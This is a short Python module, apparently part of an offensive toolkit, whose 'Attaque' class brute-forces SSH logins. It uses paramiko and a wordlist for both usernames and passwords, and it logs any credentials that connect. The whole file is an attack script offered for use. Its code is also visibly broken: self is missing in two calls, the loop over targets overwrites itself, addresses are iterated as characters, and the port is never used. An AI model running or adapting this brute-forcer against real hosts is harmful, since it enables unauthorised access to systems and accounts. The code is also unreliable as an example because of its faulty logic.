from .abstract import Abstract
import paramiko

class Attaque(Abstract):
    def __init__(self, ref):

        Abstract.__init__(ref)
    
    def run(self):
        for ip_,ports_ in self.cibles.items():
            addresses = ip_
            ports = ports_ 
        client = paramiko.SSHClient()
        with open("../files/wordlists/rockworm.txt") as wordlist:
            words = wordlist.readlines()
            for address in addresses:
                for port in ports:
                    for user in words:
                        user = user.strip()
                        for passwd in words:
                            passwd = passwd.strip()
                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            try:
                                client.connect(address, username=user, password=passwd)
                                client.close()
                                bilan([user,passwd])
                            except:
                                pass

    def bilan(self, data):
        user = data[0]
        passwd = data[1]
        self.log("[+] {}:{} connecté".format(user,passwd))
                